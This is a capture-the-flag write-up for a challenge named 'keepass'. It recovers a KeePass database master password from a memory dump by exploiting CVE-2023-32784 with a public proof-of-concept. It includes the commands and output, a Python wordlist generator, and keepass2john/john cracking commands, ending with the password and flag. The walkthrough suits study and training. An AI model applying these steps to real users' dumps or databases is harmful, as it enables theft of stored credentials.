# keepass
## Challenge 
A kdbx Database and a KeePass.DMP file were provided. The challenge is, to decrypt the kdbx database.

## Solution
KeePass had a vulnerability, that allowed a hacker to extract the master password for a kdbx database from a dump file, see [CVE-2023-32784](https://nvd.nist.gov/vuln/detail/CVE-2023-32784).
I used poc.py from [https://github.com/CMEPW/keepass-dump-masterkey](https://github.com/CMEPW/keepass-dump-masterkey) to exploit the vulnerability:
```python
python3 poc.py -d KeePass.DMP 
```
The output was:
```
2023-09-19 16:25:11,241 [.] [main] Opened KeePass.DMP
Possible password: ●3deutschlands00_00B3ST3R00_00Hack3r2023
Possible password: ●Ndeutschlands00_00B3ST3R00_00Hack3r2023
Possible password: ●cdeutschlands00_00B3ST3R00_00Hack3r2023
Possible password: ●ddeutschlands00_00B3ST3R00_00Hack3r2023
Possible password: ●edeutschlands00_00B3ST3R00_00Hack3r2023
Possible password: ●fdeutschlands00_00B3ST3R00_00Hack3r2023
Possible password: ●gdeutschlands00_00B3ST3R00_00Hack3r2023
Possible password: ●-deutschlands00_00B3ST3R00_00Hack3r2023
Possible password: ●#deutschlands00_00B3ST3R00_00Hack3r2023
Possible password: ●Wdeutschlands00_00B3ST3R00_00Hack3r2023
Possible password: ●Xdeutschlands00_00B3ST3R00_00Hack3r2023
Possible password: ●Cdeutschlands00_00B3ST3R00_00Hack3r2023
Possible password: ●0deutschlands00_00B3ST3R00_00Hack3r2023
Possible password: ●;deutschlands00_00B3ST3R00_00Hack3r2023
```

I then made a "wordlist.txt" out of it, using the following python code:
```python
password='deutschlands00_00B3ST3R00_00Hack3r2023'
second_char=['3','N','c','d','e','f','g','-','#','W','X','C','0',';']
first_char=[chr(i) for i in range(32,128)]

wordlist=[]
for s in second_char:
	for f in first_char:
		wordlist+=[f+s+password]

with open('wordlist.txt','w') as f:
	for word in wordlist:
		f.write(word+'\n')
```
using that wordlist, i brute forced the master password using john: <br/>
```keepass2john passwords.kdbx >hash.txt``` <br/>
```john --wordlist=wordlist.txt hash.txt``` <br/>
 <br/>
The master key is: `<3deutschlands00_00B3ST3R00_00Hack3r2023` <br/>
Open the kdbx Database using it to get the flag: DBH{D3utsch1ands_b3s73r_HACKER2023}
